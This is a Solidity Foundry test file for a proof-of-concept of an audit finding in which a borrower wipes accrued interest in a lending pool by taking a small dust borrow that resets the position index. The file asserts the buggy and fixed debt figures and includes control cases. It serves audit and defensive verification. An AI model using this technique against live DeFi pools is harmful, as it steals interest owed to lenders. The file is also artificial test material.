// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    LendingPool,
    LendingPoolFixed,
    DebtToken,
    RToken,
    MiniToken
} from "./63402-h-02-borrowers-can-avoid-paying-interest-for-lenders-pashov.sol";

contract BorrowersAvoidInterestTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant INDEX0 = 1e18;
    uint256 internal constant INDEX1 = 105e16; // +5% interest
    uint256 internal constant A = 1000 ether;
    uint256 internal constant B = 20 ether;

    function test_exploit_dustBorrowErasesAccruedInterest() public {
        Exploit e = new Exploit();
        e.run();

        // Before the dust borrow, the borrower's tracked debt correctly shows
        // principal + accrued interest = 1000 + 50 = 1050 crvUSD.
        assertEq(e.buggyDebtBeforeDust(), 1050 ether, "pre-dust debt = principal + interest");

        // After a 20 crvUSD dust borrow, positionIndex is reset to the current
        // usageIndex and only the 20 principal is added: tracked debt collapses to
        // 1020 crvUSD — the 50 crvUSD of accrued interest is wiped.
        assertEq(e.buggyDebtAfterDust(), 1020 ether, "post-dust debt collapses to principal + dust");

        // The correct debt after the same dust borrow (fixed pool) is 1070 crvUSD
        // (1000 principal + 50 interest + 20 dust).
        assertEq(e.fixedDebtAfterDust(), 1070 ether, "fixed pool retains accrued interest");

        // Borrower now owes 50 crvUSD LESS than it should; lenders lose that interest.
        assertLt(e.buggyDebtAfterDust(), e.fixedDebtAfterDust(), "borrower tracked less debt than owed");
        assertEq(e.erasedInterest(), 50 ether, "erased interest magnitude");

        // Marker records the lost interest at the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 50 ether, "marker records erased interest at SINK");
        assertEq(e.sinkMarkerBalance(), 50 ether, "exploit-reported sink balance matches");

        // Sanity: the pool under-tracks the borrower's real debt by exactly the
        // accrued interest (the fixed pool, which keeps the interest, tracks 50 more).
        assertEq(e.fixedDebtAfterDust() - e.buggyDebtAfterDust(), 50 ether, "pool under-tracks debt by the interest");
    }

    function test_control_freshBorrowNoAccrual_noInterestErased() public {
        // If NO interest has accrued between borrows, the dust borrow erases nothing:
        // this isolates the bug to the accrued-interest case (index reset only harms
        // when usageIndex has moved past positionIndex).
        MiniToken crvUSD = new MiniToken("crvUSD", "crvUSD");
        DebtToken debt = new DebtToken();
        RToken rToken = new RToken(crvUSD);
        LendingPool pool = new LendingPool(address(debt), address(rToken), INDEX0);
        crvUSD.mint(address(rToken), 1_000_000 ether);

        pool.borrow(A, address(0), "");
        // no accrueInterest() — index stays at INDEX0
        uint256 before = pool.positionScaledDebt(address(this));
        pool.borrow(B, address(0), "");
        uint256 afterDebt = pool.positionScaledDebt(address(this));

        assertEq(before, 1000 ether, "no interest before dust borrow");
        assertEq(afterDebt, 1020 ether, "debt = principal + dust, nothing erased");
        assertEq(afterDebt, before + B, "no interest to lose when none accrued");
    }

    function test_control_fixedPool_retainsInterestOnDustBorrow() public {
        // Explicit standalone check that the fixed pool keeps accrued interest.
        MiniToken crvUSD = new MiniToken("crvUSD", "crvUSD");
        DebtToken debt = new DebtToken();
        RToken rToken = new RToken(crvUSD);
        LendingPoolFixed pool = new LendingPoolFixed(address(debt), address(rToken), INDEX0);
        crvUSD.mint(address(rToken), 1_000_000 ether);

        pool.borrow(A, address(0), "");
        pool.accrueInterest(INDEX1);
        uint256 before = pool.positionScaledDebt(address(this));
        pool.borrow(B, address(0), "");
        uint256 afterDebt = pool.positionScaledDebt(address(this));

        assertEq(before, 1050 ether, "pre-dust debt = principal + interest");
        assertEq(afterDebt, 1070 ether, "fixed pool: principal + interest + dust retained");
        assertEq(afterDebt, before + B, "interest survives the dust borrow when fixed");
    }
}
